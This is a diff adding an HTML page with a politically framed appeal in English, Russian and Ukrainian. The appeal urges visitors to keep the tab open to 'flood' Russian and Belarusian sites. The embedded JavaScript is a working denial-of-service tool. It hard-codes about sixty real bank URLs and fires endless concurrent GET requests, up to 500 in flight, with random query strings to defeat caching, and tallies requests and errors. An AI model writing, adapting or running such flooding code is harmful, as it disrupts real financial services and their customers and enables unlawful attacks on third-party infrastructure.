@@ -1,0 +1,174 @@
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <title>Putin musí být zastaven! – Putin must be stopped</title>
+
+</head>
+<body>
+<h1 class="title">Russia and Belarus HTML DoS</h1>
+<table>
+    <tr>
+        <td>
+        <h3>English version</h3>
+        <p class="sub">For security concerns, you are able to simply save the webpage, and run locally - as well as
+            view the
+            source. It
+            is
+            entirely HTML and browser interpreted.</p>
+        <p class="sub">The "official" news in russian federation and belarus are all fake and we believe it is better to shut
+            them down! The government sites and banks are also taking a hit!</p>
+        <p class="sub">Please, just open this page and let it be open on your devices, it will flood the web-sites
+            and pose a
+            huge load
+            on
+            their infrastructure</p>
+        </td>
+    <td>
+        <h3 class="sub">Русская версия</h3>
+        <p class="sub">"Официальные" новости в рф - это театр абсурда и мы считаем, что это нужно остановить!</p>
+        <p class="sub">Пожалуйста, просто откройте эту страницу на своём компьютере и оставтье вкладку открытой, она
+            будет
+            автоматически
+            нагружать сайты российской пропаганды.</p>
+    </td>
+    <td>
+        <h3 class="sub">Українська версія</h3>
+        <p class="sub">Офіційні новини в рф - це театр абсурду і ми вважаємо, що це треба зупинити!</p>
+        <p class="sub">Будь ласка, просто залиште відкритою цю сторінку на своєму комп'ютері щоб вона автоматично
+            навантажувала
+            сайти
+            російської пропаганди.</p>
+    </td>
+
+    </tr>
+</table>
+
+   <div id="stats"></div>
+
+<div id="errors"></div>
+</body>
+<script>
+  var targets = {
+    'https://www.abank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://www.alefbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://www.albank.ru/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://capitalbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'http://www.altynbank.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'http://www.alal.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://altbank.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'http://ambbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://www.americanexpress.com/ru-ru/business/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'http://www.ankorbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'http://www.antalbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://www.apabank.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://www.aresbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://bank-arzamas.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://arsenalins.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://bankaskold.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://eurocredit.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'http://assotsiatsiyabank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://test-client.afbank.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
+'http://www.bbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'http://www.baikalcredobank.ru/irk/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'http://www.balakovo-bank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'http://www.baltica.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://baltinvestbank.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://2tbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://www.bspb.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://www.sksbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://131.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'http://www.bereit.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'http://www.bft.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'http://www.bankgorod.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://domrfbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'http://www.ipoteka-tut.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://www.zenit.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://www.bancaintesa.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://www.bankofkazan.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://www.cfb.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://www.credit-suisse.com/ru/ru.html': { number_of_requests: 0, number_of_errored_responses: 0 },
+'http://www.mbfi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'http://www.bnkv.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://www.bankorange.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://orbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://premcred.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://www.round.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://www.bankrmp.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'http://bankrsi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://severgazbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://www.finam.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'http://www.bankfininvest.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'http://bank24.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'http://www.bankirdom.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://bbr.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://belsocbank.ru/ru/reqvisits/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'http://www.benefitbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://www.besteffortsbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'http://www.bstbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://bcs-bank.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://blanc.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://vbank.bm-bank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://www.bmwbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'http://www.bnpparibasbank.ru/ru/bnp-paribas/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://sbibankllc.ru/': { number_of_requests: 0, number_of_errored_responses: 0 }
+       }    
+  
+
+  var statsEl = document.getElementById('stats');
+  function printStats() {
+    statsEl.innerHTML = '<table border="1"><thead><tr><th>Web</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' + Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses  }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>'
+  }
+  setInterval(printStats, 1000);
+
+  var CONCURRENCY_LIMIT = 500
+  var queue = []
+
+  async function fetchWithTimeout(resource, options) {
+    const controller = new AbortController();
+    const id = setTimeout(() => controller.abort(), options.timeout);
+    return fetch(resource, {
+      method: 'GET',
+      mode: 'no-cors',
+      signal: controller.signal
+    }).then((response) => {
+  
+      clearTimeout(id);
+      
+      return response;
+    }).catch((error) => {
+        console.log(error.code);
+      clearTimeout(id);
+      throw error;
+    });
+  }
+
+  async function flood(target) {
+    for (var i = 0;; ++i) {
+      if (queue.length > CONCURRENCY_LIMIT) {
+        await queue.shift()
+      }
+      rand = i % 3 === 0 ? '' : ('?' + Math.random() * 2000)
+      queue.push(
+        fetchWithTimeout(target+rand, { timeout: 1000 })
+          .catch((error) => {
+            if (error.code === 20 /* ABORT */) {
+              return;
+            }
+            targets[target].number_of_errored_responses++;
+          })
+          .then((response) => {
+            if (response && !response.ok) {
+              targets[target].number_of_errored_responses++;
+            }
+            targets[target].number_of_requests++;
+          })
+
+      )
+    }
+  }
+  
+  // Start
+  Object.keys(targets).map(flood)
+</script>
